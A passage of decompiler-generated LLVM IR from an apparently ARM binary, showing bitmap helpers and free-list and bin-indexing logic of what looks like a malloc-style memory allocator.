dec_label_pc_14be8:
  %v1_14be8 = add i32 %arg2, -1
  %v3_14bec = udiv i32 %v1_14be8, 32
  %v4_14bf0 = mul nuw nsw i32 %v3_14bec, 4
  %v5_14bf0 = add i32 %v4_14bf0, %arg1
  %v6_14bf0 = inttoptr i32 %v5_14bf0 to i32*
  %v7_14bf0 = load i32, i32* %v6_14bf0, align 4
  %v1_14bf4 = urem i32 %v1_14be8, 32
  %v7_14bfc = shl i32 1, %v1_14bf4
  %v8_14bfc = and i32 %v7_14bf0, %v7_14bfc
  %v10_14bfc = icmp ne i32 %v8_14bfc, 0
  %. = zext i1 %v10_14bfc to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_14be8, { 1, 0 }
}

define i32 @function_14c0c() local_unnamed_addr {
dec_label_pc_14c0c:
  %v0_14c0c = load i32, i32* @r1, align 4
  %v1_14c0c = add i32 %v0_14c0c, -1
  %v3_14c10 = udiv i32 %v1_14c0c, 32
  %v0_14c14 = load i32, i32* @r0, align 4
  %v4_14c14 = mul nuw nsw i32 %v3_14c10, 4
  %v5_14c14 = add i32 %v0_14c14, %v4_14c14
  %v6_14c14 = inttoptr i32 %v5_14c14 to i32*
  %v7_14c14 = load i32, i32* %v6_14c14, align 4
  %v1_14c18 = urem i32 %v1_14c0c, 32
  %v7_14c20 = shl i32 1, %v1_14c18
  %v8_14c20 = or i32 %v7_14c14, %v7_14c20
  store i32 %v8_14c20, i32* %v6_14c14, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14c0c, { 1, 0 }
}

define i32 @function_14c30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14c30:
  %v1_14c30 = add i32 %arg2, -1
  %v3_14c34 = udiv i32 %v1_14c30, 32
  %v4_14c38 = mul nuw nsw i32 %v3_14c34, 4
  %v5_14c38 = add i32 %v4_14c38, %arg1
  %v6_14c38 = inttoptr i32 %v5_14c38 to i32*
  %v7_14c38 = load i32, i32* %v6_14c38, align 4
  %v1_14c3c = urem i32 %v1_14c30, 32
  %tmp = shl i32 -1, %v1_14c3c
  %v8_14c44 = add i32 %tmp, -1
  %v9_14c44 = and i32 %v7_14c38, %v8_14c44
  store i32 %v9_14c44, i32* %v6_14c38, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14c30, { 1, 0 }
}

define i32 @function_14c54(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c54:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_14c54 = udiv i32 %arg1, 256
  store i32 %v3_14c54, i32* %r1.global-to-local, align 4
  %v2_14c58 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_14c58, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_14c54
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_14c54, %bb
  %v0_14c64 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14c58, i32 %v0_14c64)
  %v0_14c68 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c68 = add i32 %v0_14c68, 1048320
  %v3_14c6c = udiv i32 %v1_14c68, 65536
  %v1_14c70 = and i32 %v3_14c6c, 8
  %v6_14c74 = shl i32 %v0_14c68, %v1_14c70
  %v1_14c78 = add i32 %v6_14c74, 520192
  %v3_14c7c = udiv i32 %v1_14c78, 65536
  %v1_14c80 = and i32 %v3_14c7c, 4
  %v6_14c84 = shl i32 %v6_14c74, %v1_14c80
  %v1_14c88 = add i32 %v6_14c84, 245760
  %v3_14c8c = udiv i32 %v1_14c88, 65536
  %v1_14c90 = and i32 %v3_14c8c, 2
  %v6_14c94 = shl i32 %v6_14c84, %v1_14c90
  store i32 %v6_14c94, i32* %r1.global-to-local, align 4
  %v1_14c98 = sub nsw i32 13, %v1_14c70
  %v2_14c9c = sub nsw i32 %v1_14c98, %v1_14c80
  %v3_14ca0 = udiv i32 %v6_14c94, 32768
  %v4_14ca0 = sub nuw nsw i32 -1, %v3_14ca0
  %v4_14ca4 = udiv i32 %v6_14c94, 16384
  %v5_14ca4 = and i32 %v4_14ca4, %v4_14ca0
  %v2_14ca8 = sub nsw i32 %v2_14c9c, %v1_14c90
  %v2_14cac = add nsw i32 %v2_14ca8, %v5_14ca4
  %v1_14cb0 = add nsw i32 %v2_14cac, 6
  %v0_14cb4 = load i32, i32* %ip.global-to-local, align 4
  %v6_14cb4 = lshr i32 %v0_14cb4, %v1_14cb0
  %v3_14cb8 = mul nsw i32 %v2_14cac, 4
  %v1_14cbc = add nsw i32 %v3_14cb8, 32
  %v1_14cc0 = urem i32 %v6_14cb4, 4
  %v2_14cc4 = or i32 %v1_14cc0, %v1_14cbc
  ret i32 %v2_14cc4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_14ccc(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ccc:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_14ccc = load i32, i32* @r4, align 4
  %v6_14ccc = load i32, i32* @r5, align 4
  %v9_14ccc = load i32, i32* @r6, align 4
  %v12_14ccc = load i32, i32* @r7, align 4
  %v15_14ccc = load i32, i32* @r8, align 4
  %v18_14ccc = load i32, i32* @sb, align 4
  %v21_14ccc = load i32, i32* @sl, align 4
  %v24_14ccc = load i32, i32* @fp, align 4
  %v27_14ccc = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r1.global-to-local, align 4
  %v4_14ce0 = load i32, i32* inttoptr (i32 180332 to i32*), align 4
  store i32 %v4_14ce0, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_14cec = load i32, i32* inttoptr (i32 180296 to i32*), align 8
  store i32 %v4_14cec, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_14ce0, i32* @r2, align 4
  %v2_14cf8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14cf8, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %ip.global-to-local, align 4
  %v4_14d04 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  store i32 %v4_14d04, i32* %ip.global-to-local, align 4
  store i32 85264, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14d04)
  %v0_14d10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14d10, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r1.global-to-local, align 4
  %v4_14d1c = load i32, i32* inttoptr (i32 180276 to i32*), align 4
  store i32 %v4_14d1c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_14d28.791 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14d1c)
  %v0_14d28 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_14d28, -32
  br i1 %tmp, label %dec_label_pc_14d44, label %dec_label_pc_14d30

dec_label_pc_14d30:                               ; preds = %dec_label_pc_14ccc
  %v0_14d30 = call i32 @function_12b24()
  store i32 %v0_14d30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_14d3c = inttoptr i32 %v0_14d30 to i32*
  store i32 12, i32* %v2_14d3c, align 4
  br label %dec_label_pc_155c0

dec_label_pc_14d44:                               ; preds = %dec_label_pc_14ccc
  %v1_14d44 = add i32 %v0_14d28, 11
  store i32 %v1_14d44, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r2.global-to-local, align 4
  %v2_14d50 = icmp ugt i32 %v1_14d44, 14
  %v7_14d50 = icmp eq i32 %v1_14d44, 15
  %v2_14d54 = xor i1 %v7_14d50, true
  %v3_14d54 = and i1 %v2_14d50, %v2_14d54
  br i1 %v3_14d54, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_14d44
  %v5_14d54 = and i32 %v1_14d44, -8
  store i32 %v5_14d54, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_14d44, %bb
  %v4_14d58 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_14d58, i32* @r0, align 4
  %v1_14d5c = inttoptr i32 %v4_14d58 to i32*
  %v2_14d5c = load i32, i32* %v1_14d5c, align 4
  store i32 %v2_14d5c, i32* @r4, align 4
  %v2_14d60 = xor i1 %v2_14d50, true
  %v3_14d60 = or i1 %v7_14d50, %v2_14d60
  br i1 %v3_14d60, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_14d64 = urem i32 %v2_14d5c, 2
  %v2_14d64 = icmp eq i32 %v1_14d64, 0
  br i1 %v2_14d64, label %dec_label_pc_14d6c, label %dec_label_pc_14d7c

dec_label_pc_14d6c:                               ; preds = %bb140
  %v2_14d6c = icmp eq i32 %v2_14d5c, 0
  br i1 %v2_14d6c, label %dec_label_pc_14d74, label %dec_label_pc_15158

dec_label_pc_14d74:                               ; preds = %dec_label_pc_14d6c
  %v0_14d74 = call i32 @function_1569c()
  store i32 %v0_14d74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15158

dec_label_pc_14d7c:                               ; preds = %bb140
  %v0_14d7c = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_14d7c, %v2_14d5c
  br i1 %tmp201, label %dec_label_pc_14da4, label %dec_label_pc_14d84

dec_label_pc_14d84:                               ; preds = %dec_label_pc_14d7c
  %v1_14d84 = add i32 %v4_14d58, -4
  store i32 %v1_14d84, i32* %r1.global-to-local, align 4
  %v3_14d88 = udiv i32 %v0_14d7c, 8
  store i32 %v3_14d88, i32* %r2.global-to-local, align 4
  %v4_14d8c = mul nuw i32 %v3_14d88, 4
  %v5_14d8c = add i32 %v4_14d8c, %v1_14d84
  %v6_14d8c = inttoptr i32 %v5_14d8c to i32*
  %v7_14d8c = load i32, i32* %v6_14d8c, align 4
  store i32 %v7_14d8c, i32* %r0.global-to-local, align 4
  %v2_14d90 = icmp eq i32 %v7_14d8c, 0
  br i1 %v2_14d90, label %dec_label_pc_14da4, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14d84
  %v2_14d94 = add i32 %v7_14d8c, 8
  %v3_14d94 = inttoptr i32 %v2_14d94 to i32*
  %v4_14d94 = load i32, i32* %v3_14d94, align 4
  store i32 %v4_14d94, i32* %r3.global-to-local, align 4
  store i32 %v2_14d94, i32* %r0.global-to-local, align 4
  store i32 %v2_14d94, i32* %r4.global-to-local, align 4
  store i32 %v4_14d94, i32* %v6_14d8c, align 4
  br label %dec_label_pc_155a4

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d84, %dec_label_pc_14d7c
  %tmp202 = icmp ugt i32 %v0_14d7c, 255
  br i1 %tmp202, label %dec_label_pc_14df4, label %dec_label_pc_14dac

dec_label_pc_14dac:                               ; preds = %dec_label_pc_14da4
  store i32 180260, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_14db4 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  %v3_14db8 = udiv i32 %v0_14d7c, 8
  store i32 %v3_14db8, i32* @r7, align 4
  %v4_14dbc = mul nuw i32 %v3_14db8, 8
  %v5_14dbc = add i32 %v4_14db4, %v4_14dbc
  store i32 %v5_14dbc, i32* %r3.global-to-local, align 4
  %v1_14dc0 = add i32 %v5_14dbc, 44
  store i32 %v1_14dc0, i32* %ip.global-to-local, align 4
  %v1_14dc4 = add i32 %v5_14dbc, 56
  %v2_14dc4 = inttoptr i32 %v1_14dc4 to i32*
  %v3_14dc4 = load i32, i32* %v2_14dc4, align 4
  store i32 %v3_14dc4, i32* %r0.global-to-local, align 4
  %v9_14dc8 = icmp eq i32 %v3_14dc4, %v1_14dc0
  br i1 %v9_14dc8, label %dec_label_pc_14f54, label %dec_label_pc_14dd0

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14dac
  %v2_14dd0 = add i32 %v3_14dc4, %v0_14d7c
  store i32 %v2_14dd0, i32* %r3.global-to-local, align 4
  %v1_14dd4 = add i32 %v2_14dd0, 4
  %v2_14dd4 = inttoptr i32 %v1_14dd4 to i32*
  %v3_14dd4 = load i32, i32* %v2_14dd4, align 4
  store i32 %v3_14dd4, i32* %r2.global-to-local, align 4
  %v1_14dd8 = add i32 %v3_14dc4, 12
  %v2_14dd8 = inttoptr i32 %v1_14dd8 to i32*
  %v3_14dd8 = load i32, i32* %v2_14dd8, align 4
  store i32 %v3_14dd8, i32* %r1.global-to-local, align 4
  %v1_14ddc = or i32 %v3_14dd4, 1
  store i32 %v1_14ddc, i32* %r2.global-to-local, align 4
  %v1_14de0 = add i32 %v3_14dc4, 8
  store i32 %v1_14de0, i32* %r4.global-to-local, align 4
  store i32 %v1_14ddc, i32* %v2_14dd4, align 4
  %v0_14de8 = load i32, i32* %ip.global-to-local, align 4
  %v1_14de8 = load i32, i32* %r1.global-to-local, align 4
  %v2_14de8 = add i32 %v1_14de8, 8
  %v3_14de8 = inttoptr i32 %v2_14de8 to i32*
  store i32 %v0_14de8, i32* %v3_14de8, align 4
  %v0_14dec = load i32, i32* %r1.global-to-local, align 4
  %v1_14dec = load i32, i32* %ip.global-to-local, align 4
  %v2_14dec = add i32 %v1_14dec, 12
  %v3_14dec = inttoptr i32 %v2_14dec to i32*
  store i32 %v0_14dec, i32* %v3_14dec, align 4
  br label %dec_label_pc_155a4

dec_label_pc_14df4:                               ; preds = %dec_label_pc_14da4
  store i32 %v0_14d7c, i32* %r0.global-to-local, align 4
  %v1_14df8 = call i32 @function_14c54(i32 %v0_14d7c)
  store i32 %v1_14df8, i32* %r0.global-to-local, align 4
  %v0_14dfc = load i32, i32* @r4, align 4
  %v1_14dfc = and i32 %v0_14dfc, 2
  %v2_14dfc = icmp eq i32 %v1_14dfc, 0
  store i32 %v1_14df8, i32* @r7, align 4
  br i1 %v2_14dfc, label %dec_label_pc_14f54, label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14df4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r1.global-to-local, align 4
  %v4_14e10 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_14e10, i32* @r0, align 4
  %v0_14e14 = call i32 @function_1569c()
  store i32 %v0_14e14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14f54

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14f68
  %v1_14e1c = add i32 %v3_14f68, 4
  %v2_14e1c = inttoptr i32 %v1_14e1c to i32*
  %v3_14e1c = load i32, i32* %v2_14e1c, align 4
  store i32 %v3_14e1c, i32* %r3.global-to-local, align 4
  %v0_14e20 = load i32, i32* @sl, align 4
  %v1_14e24 = and i32 %v3_14e1c, -4
  store i32 %v1_14e24, i32* %r4.global-to-local, align 4
  %v1_14e28 = add i32 %v3_14f68, 12
  %v2_14e28 = inttoptr i32 %v1_14e28 to i32*
  %v3_14e28 = load i32, i32* %v2_14e28, align 4
  store i32 %v3_14e28, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_14e20, 255
  br i1 %tmp203, label %dec_label_pc_14e84, label %dec_label_pc_14e30

dec_label_pc_14e30:                               ; preds = %dec_label_pc_14e1c
  %v9_14e30 = icmp eq i32 %v3_14e28, %v0_14e88
  br i1 %v9_14e30, label %dec_label_pc_14e38, label %dec_label_pc_14e84

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14e30
  %v0_14e38 = load i32, i32* @sb, align 4
  %v1_14e38 = add i32 %v0_14e38, 48
  %v2_14e38 = inttoptr i32 %v1_14e38 to i32*
  %v3_14e38 = load i32, i32* %v2_14e38, align 4
  store i32 %v3_14e38, i32* %r3.global-to-local, align 4
  %v9_14e3c = icmp eq i32 %v3_14f68, %v3_14e38
  br i1 %v9_14e3c, label %dec_label_pc_14e44, label %dec_label_pc_14e84

dec_label_pc_14e44:                               ; preds = %dec_label_pc_14e38
  %v1_14e44 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_14e24, %v1_14e44
  br i1 %tmp204, label %dec_label_pc_14e4c, label %dec_label_pc_14e84

dec_label_pc_14e4c:                               ; preds = %dec_label_pc_14e44
  %v2_14e4c = sub i32 %v1_14e24, %v0_14e20
  store i32 %v2_14e4c, i32* %r2.global-to-local, align 4
  %v2_14e50 = add i32 %v0_14e20, %v3_14f68
  store i32 %v2_14e50, i32* %r3.global-to-local, align 4
  %v1_14e54 = or i32 %v0_14e20, 1
  store i32 %v1_14e54, i32* %r0.global-to-local, align 4
  %v1_14e58 = or i32 %v2_14e4c, 1
  store i32 %v1_14e58, i32* %r1.global-to-local, align 4
  %v1_14e5c = add i32 %v3_14f68, 8
  store i32 %v1_14e5c, i32* %r4.global-to-local, align 4
  %v2_14e60 = add i32 %v0_14e88, 8
  %v3_14e60 = inttoptr i32 %v2_14e60 to i32*
  store i32 %v2_14e50, i32* %v3_14e60, align 4
  %v0_14e64 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e64 = load i32, i32* %ip.global-to-local, align 4
  %v2_14e64 = add i32 %v1_14e64, 12
  %v3_14e64 = inttoptr i32 %v2_14e64 to i32*
  store i32 %v0_14e64, i32* %v3_14e64, align 4
  %v0_14e68 = load i32, i32* %r0.global-to-local, align 4
  %v1_14e68 = load i32, i32* @r6, align 4
  %v2_14e68 = add i32 %v1_14e68, 4
  %v3_14e68 = inttoptr i32 %v2_14e68 to i32*
  store i32 %v0_14e68, i32* %v3_14e68, align 4
  %v0_14e6c = load i32, i32* %r3.global-to-local, align 4
  %v1_14e6c = load i32, i32* @sb, align 4
  %v2_14e6c = add i32 %v1_14e6c, 48
  %v3_14e6c = inttoptr i32 %v2_14e6c to i32*
  store i32 %v0_14e6c, i32* %v3_14e6c, align 4
  %v0_14e70 = load i32, i32* %r2.global-to-local, align 4
  %v1_14e70 = load i32, i32* %r3.global-to-local, align 4
  %v3_14e70 = add i32 %v1_14e70, %v0_14e70
  %v4_14e70 = inttoptr i32 %v3_14e70 to i32*
  store i32 %v0_14e70, i32* %v4_14e70, align 4
  %v0_14e74 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e74 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e74 = add i32 %v1_14e74, 4
  %v3_14e74 = inttoptr i32 %v2_14e74 to i32*
  store i32 %v0_14e74, i32* %v3_14e74, align 4
  %v0_14e78 = load i32, i32* %ip.global-to-local, align 4
  %v1_14e78 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e78 = add i32 %v1_14e78, 12
  %v3_14e78 = inttoptr i32 %v2_14e78 to i32*
  store i32 %v0_14e78, i32* %v3_14e78, align 4
  %v0_14e7c = load i32, i32* %ip.global-to-local, align 4
  %v1_14e7c = load i32, i32* %r3.global-to-local, align 4
  %v2_14e7c = add i32 %v1_14e7c, 8
  %v3_14e7c = inttoptr i32 %v2_14e7c to i32*
  store i32 %v0_14e7c, i32* %v3_14e7c, align 4
  br label %dec_label_pc_155a4

dec_label_pc_14e84:                               ; preds = %dec_label_pc_14e44, %dec_label_pc_14e38, %dec_label_pc_14e30, %dec_label_pc_14e1c
  %v9_14e84 = icmp eq i32 %v1_14e24, %v0_14e20
  %v2_14e88 = add i32 %v3_14e28, 8
  %v3_14e88 = inttoptr i32 %v2_14e88 to i32*
  store i32 %v0_14e88, i32* %v3_14e88, align 4
  %v0_14e8c = load i32, i32* %ip.global-to-local, align 4
  %v1_14e8c = load i32, i32* %r5.global-to-local, align 4
  %v2_14e8c = add i32 %v1_14e8c, 12
  %v3_14e8c = inttoptr i32 %v2_14e8c to i32*
  store i32 %v0_14e8c, i32* %v3_14e8c, align 4
  br i1 %v9_14e84, label %dec_label_pc_14fe4.loopexit, label %dec_label_pc_14ea0

dec_label_pc_14ea0:                               ; preds = %dec_label_pc_14e84
  %v0_14ea0 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_14ea0, 255
  br i1 %tmp205, label %dec_label_pc_14ec4, label %dec_label_pc_14ea8

dec_label_pc_14ea8:                               ; preds = %dec_label_pc_14ea0
  store i32 180260, i32* %r2.global-to-local, align 4
  %v1_14eac = load i32, i32* %r8.global-to-local, align 4
  %v2_14eac = add i32 %v1_14eac, 180260
  %v3_14eac = inttoptr i32 %v2_14eac to i32*
  %v4_14eac = load i32, i32* %v3_14eac, align 4
  %v3_14eb0 = udiv i32 %v0_14ea0, 8
  store i32 %v3_14eb0, i32* %r0.global-to-local, align 4
  %v4_14eb4 = mul nuw i32 %v3_14eb0, 8
  %v5_14eb4 = add i32 %v4_14eac, %v4_14eb4
  store i32 %v5_14eb4, i32* %r3.global-to-local, align 4
  %v1_14eb8 = add i32 %v5_14eb4, 44
  store i32 %v1_14eb8, i32* %ip.global-to-local, align 4
  %v1_14ebc = add i32 %v5_14eb4, 52
  %v2_14ebc = inttoptr i32 %v1_14ebc to i32*
  %v3_14ebc = load i32, i32* %v2_14ebc, align 4
  store i32 %v3_14ebc, i32* @lr, align 4
  br label %dec_label_pc_14f1c

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14ea0
  store i32 %v0_14ea0, i32* %r0.global-to-local, align 4
  %v1_14ec8 = call i32 @function_14c54(i32 %v0_14ea0)
  store i32 %v1_14ec8, i32* %r0.global-to-local, align 4
  store i32 180260, i32* %ip.global-to-local, align 4
  %v1_14ed0 = load i32, i32* %r8.global-to-local, align 4
  %v2_14ed0 = add i32 %v1_14ed0, 180260
  %v3_14ed0 = inttoptr i32 %v2_14ed0 to i32*
  %v4_14ed0 = load i32, i32* %v3_14ed0, align 4
  %v4_14ed4 = mul i32 %v1_14ec8, 8
  %v5_14ed4 = add i32 %v4_14ed0, %v4_14ed4
  store i32 %v5_14ed4, i32* %r3.global-to-local, align 4
  %v1_14ed8 = add i32 %v5_14ed4, 44
  store i32 %v1_14ed8, i32* %ip.global-to-local, align 4
  %v1_14edc = add i32 %v5_14ed4, 52
  %v2_14edc = inttoptr i32 %v1_14edc to i32*
  %v3_14edc = load i32, i32* %v2_14edc, align 4
  store i32 %v3_14edc, i32* @lr, align 4
  %v9_14ee0 = icmp eq i32 %v3_14edc, %v1_14ed8
  br i1 %v9_14ee0, label %dec_label_pc_14f1c, label %dec_label_pc_14ee8

dec_label_pc_14ee8:                               ; preds = %dec_label_pc_14ec4
  %v1_14ee8 = add i32 %v5_14ed4, 56
  %v2_14ee8 = inttoptr i32 %v1_14ee8 to i32*
  %v3_14ee8 = load i32, i32* %v2_14ee8, align 4
  store i32 %v3_14ee8, i32* %r1.global-to-local, align 4
  %v1_14eec = add i32 %v3_14ee8, 4
  %v2_14eec = inttoptr i32 %v1_14eec to i32*
  %v3_14eec = load i32, i32* %v2_14eec, align 4
  store i32 %v3_14eec, i32* %r3.global-to-local, align 4
  %v0_14ef0 = load i32, i32* %r4.global-to-local, align 4
  %v3_14ef0 = icmp ult i32 %v0_14ef0, %v3_14eec
  br i1 %v3_14ef0, label %.thread, label %dec_label_pc_14f0c.preheader

.thread:                                          ; preds = %dec_label_pc_14ee8
  store i32 %v1_14ed8, i32* @lr, align 4
  store i32 %v3_14ee8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14f1c

dec_label_pc_14f0c.preheader:                     ; preds = %dec_label_pc_14ee8
  %v2_14ef8 = or i32 %v0_14ef0, 1
  store i32 %v2_14ef8, i32* %r2.global-to-local, align 4
  %v1_14f0c179 = add i32 %v3_14edc, 4
  %v2_14f0c180 = inttoptr i32 %v1_14f0c179 to i32*
  %v3_14f0c181 = load i32, i32* %v2_14f0c180, align 4
  store i32 %v3_14f0c181, i32* %r3.global-to-local, align 4
  %v3_14f10183 = icmp ult i32 %v2_14ef8, %v3_14f0c181
  br i1 %v3_14f10183, label %dec_label_pc_14f08, label %dec_label_pc_14f18

dec_label_pc_14f08:                               ; preds = %dec_label_pc_14f0c.preheader, %dec_label_pc_14f08
  %v0_14f18184 = phi i32 [ %v3_14f08, %dec_label_pc_14f08 ], [ %v3_14edc, %dec_label_pc_14f0c.preheader ]
  %v1_14f08 = add i32 %v0_14f18184, 8
  %v2_14f08 = inttoptr i32 %v1_14f08 to i32*
  %v3_14f08 = load i32, i32* %v2_14f08, align 4
  store i32 %v3_14f08, i32* @lr, align 4
  %v1_14f0c = add i32 %v3_14f08, 4
  %v2_14f0c = inttoptr i32 %v1_14f0c to i32*
  %v3_14f0c = load i32, i32* %v2_14f0c, align 4
  store i32 %v3_14f0c, i32* %r3.global-to-local, align 4
  %v3_14f10 = icmp ult i32 %v2_14ef8, %v3_14f0c
  br i1 %v3_14f10, label %dec_label_pc_14f08, label %dec_label_pc_14f18

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14f08, %dec_label_pc_14f0c.preheader
  %v0_14f18.lcssa = phi i32 [ %v3_14edc, %dec_label_pc_14f0c.preheader ], [ %v3_14f08, %dec_label_pc_14f08 ]
  %v1_14f18 = add i32 %v0_14f18.lcssa, 12
  %v2_14f18 = inttoptr i32 %v1_14f18 to i32*
  %v3_14f18 = load i32, i32* %v2_14f18, align 4
  store i32 %v3_14f18, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14f1c

dec_label_pc_14f1c:                               ; preds = %.thread, %dec_label_pc_14ec4, %dec_label_pc_14ea8, %dec_label_pc_14f18
  %v0_14f3c = phi i32 [ %v1_14ed8, %dec_label_pc_14ec4 ], [ %v1_14eb8, %dec_label_pc_14ea8 ], [ %v3_14f18, %dec_label_pc_14f18 ], [ %v3_14ee8, %.thread ]
  %v0_14f30 = phi i32 [ %v1_14ec8, %dec_label_pc_14ec4 ], [ %v3_14eb0, %dec_label_pc_14ea8 ], [ %v1_14ec8, %dec_label_pc_14f18 ], [ %v1_14ec8, %.thread ]
  %v1_14f20 = phi i32 [ %v1_14ed0, %dec_label_pc_14ec4 ], [ %v1_14eac, %dec_label_pc_14ea8 ], [ %v1_14ed0, %dec_label_pc_14f18 ], [ %v1_14ed0, %.thread ]
  store i32 180260, i32* %r2.global-to-local, align 4
  %v2_14f20 = add i32 %v1_14f20, 180260
  %v3_14f20 = inttoptr i32 %v2_14f20 to i32*
  %v4_14f20 = load i32, i32* %v3_14f20, align 4
  %v3_14f24 = sdiv i32 %v0_14f30, 32
  store i32 %v3_14f24, i32* %r3.global-to-local, align 4
  %v4_14f28 = mul nsw i32 %v3_14f24, 4
  %v5_14f28 = add i32 %v4_14f20, %v4_14f28
  store i32 %v5_14f28, i32* %r1.global-to-local, align 4
  %v1_14f2c = add i32 %v5_14f28, 820
  %v2_14f2c = inttoptr i32 %v1_14f2c to i32*
  %v3_14f2c = load i32, i32* %v2_14f2c, align 4
  %v1_14f30 = urem i32 %v0_14f30, 32
  store i32 %v1_14f30, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_14f38 = shl i32 1, %v1_14f30
  %v8_14f38 = or i32 %v3_14f2c, %v7_14f38
  store i32 %v8_14f38, i32* %r3.global-to-local, align 4
  %v1_14f3c = load i32, i32* @r6, align 4
  %v2_14f3c = add i32 %v1_14f3c, 12
  %v3_14f3c = inttoptr i32 %v2_14f3c to i32*
  store i32 %v0_14f3c, i32* %v3_14f3c, align 4
  %v0_14f40 = load i32, i32* @lr, align 4
  %v1_14f40 = load i32, i32* @r6, align 4
  %v2_14f40 = add i32 %v1_14f40, 8
  %v3_14f40 = inttoptr i32 %v2_14f40 to i32*
  store i32 %v0_14f40, i32* %v3_14f40, align 4
  %v0_14f44 = load i32, i32* %r3.global-to-local, align 4
  %v1_14f44 = load i32, i32* %r1.global-to-local, align 4
  %v2_14f44 = add i32 %v1_14f44, 820
  %v3_14f44 = inttoptr i32 %v2_14f44 to i32*
  store i32 %v0_14f44, i32* %v3_14f44, align 4
  %v0_14f48 = load i32, i32* @r6, align 4
  %v1_14f48 = load i32, i32* @lr, align 4
  %v2_14f48 = add i32 %v1_14f48, 12
  %v3_14f48 = inttoptr i32 %v2_14f48 to i32*
  store i32 %v0_14f48, i32* %v3_14f48, align 4
  %v0_14f4c = load i32, i32* @r6, align 4
  %v1_14f4c = load i32, i32* %ip.global-to-local, align 4
  %v2_14f4c = add i32 %v1_14f4c, 8
  %v3_14f4c = inttoptr i32 %v2_14f4c to i32*
  store i32 %v0_14f4c, i32* %v3_14f4c, align 4
  %v0_14f68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14f68

dec_label_pc_14f54:                               ; preds = %dec_label_pc_14df4, %dec_label_pc_14dac, %dec_label_pc_14e08
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 180260, i32* %r1.global-to-local, align 4
  %v4_14f5c = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_14f5c, i32* @sb, align 4
  %v0_14f60 = load i32, i32* @sl, align 4
  %v1_14f60 = add i32 %v0_14f60, 16
  store i32 %v1_14f60, i32* @fp, align 4
